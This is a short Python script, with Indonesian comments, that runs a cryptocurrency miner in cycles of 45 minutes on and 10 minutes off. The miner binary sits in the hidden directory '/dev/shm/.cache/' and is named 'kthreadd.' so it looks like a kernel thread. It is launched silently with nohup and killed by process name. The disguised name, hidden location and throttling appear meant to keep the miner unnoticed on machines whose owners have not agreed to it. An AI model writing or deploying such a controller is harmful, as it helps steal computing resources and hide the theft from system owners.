import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
MINER_NAME = "kthreadd."  # Nama miner buat kill
MINING_TIME = 2700  # 45 menit
REST_TIME = 600  # 10 menit

def kill_miner():
    os.system(f"pkill -f {MINER_NAME}")

def start_miner():
    print("🚀 Jalanin miner...")
    command = f"nohup {MINER_PATH} > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        start_miner()
        time.sleep(MINING_TIME)
        kill_miner()
        time.sleep(REST_TIME)

def sigint_handler(sig, frame):
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
